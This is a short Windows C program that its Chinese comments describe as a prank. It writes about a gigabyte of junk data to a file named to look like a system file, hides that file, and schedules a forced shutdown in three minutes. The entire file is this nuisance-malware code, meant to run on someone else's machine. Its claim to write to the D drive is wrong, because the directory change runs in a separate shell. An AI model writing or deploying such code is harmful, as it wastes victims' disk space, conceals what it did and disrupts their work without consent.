#define _CRT_SECURE_NO_WARNINGS

//这是一个恶作剧
//不停写入无用数据到D盘
//并且会关机

#include <stdio.h>
#include <windows.h>

int main()
{
	//打开文件
	FILE* pf = fopen("windows.bin", "wb");
	if (pf == NULL)
	{
		perror("error_fopen_wb");
		return 1;
	}
	//操作文件
	int i = 1;
	int m = 1024 * 1024 * 1000 / 4;//1GB = 1024MB = 1024*1024KB = 1024*1024*1000byte;
	while (i<m)
	{
		fwrite(&i, sizeof(i), 1, pf);
		i++;
	}
	//关闭文件
	fclose(pf);
	pf = NULL;
	system("cd /D D:\\");
	system("attrib \"windows.bin\" +h");
	system("shutdown -s -t 180");

	return 0;
}